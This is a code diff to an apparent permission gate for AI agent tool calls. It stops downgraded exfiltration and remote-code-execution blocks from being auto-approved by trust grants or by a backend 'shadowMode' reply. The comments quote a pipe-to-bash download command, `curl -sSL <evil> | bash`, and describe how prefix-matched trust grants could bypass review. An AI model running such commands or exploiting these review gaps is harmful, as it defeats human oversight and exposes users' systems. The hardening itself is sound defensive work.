@@ -1003,7 +1003,18 @@ async function _authorizeHeadlessCore(
 
   // Trust session bypass — only for review-path calls, never for taint detection.
   // Runs after hard-block evaluation so block-verdict rules are always enforced.
-  if (!taintWarning && !appPermReview && getActiveTrustSession(toolName, args)) {
+  // Round-3 F1b: a DOWNGRADED hard block (an intrinsic exfil/RCE block softened
+  // to review) must not be resolved by a prior time-boxed "always allow" trust
+  // grant either — same non-human-channel class as the persistent consult
+  // (:951) and the cloud guards below. Trust matches on the first two command
+  // words, so a benign `curl -sSL <x>` grant would otherwise auto-allow a later
+  // `curl -sSL <evil> | bash`. Fail closed: a downgraded block skips trust.
+  if (
+    !taintWarning &&
+    !appPermReview &&
+    !hardBlockDowngraded &&
+    getActiveTrustSession(toolName, args)
+  ) {
     // Local row only — cloud delivery via the outbox shipper.
     if (!isManual) appendLocalAudit(toolName, args, 'allow', 'trust', meta, hashAuditArgs);
     return { approved: true, checkedBy: 'trust' };
@@ -1115,7 +1126,17 @@ async function _authorizeHeadlessCore(
         // per-tool decision beats a global observe toggle) — and this also closes
         // a stale/compromised-BE bypass (a BE answering shadowMode to skip the
         // review). Fall through to the race instead of auto-allowing.
-        if (initResult.shadowMode && !appPermReview) {
+        // Round-3 F1c: mirror the immediate-allow guard below — a local review
+        // match (incl. a downgraded hard block, which sets localSmartRuleMatched
+        // via hardBlockDowngraded) means forceReview was sent; a shadowMode
+        // response must not resolve it. Without this, a shadow/observe org (or a
+        // stale BE ignoring forceReview) auto-allows a downgraded intrinsic block.
+        if (
+          initResult.shadowMode &&
+          !localSmartRuleMatched &&
+          !options?.localSmartRuleMatched &&
+          !appPermReview
+        ) {
           return { approved: true, checkedBy: 'cloud' };
         }
         // A local smart rule with verdict "review" represents explicit user intent
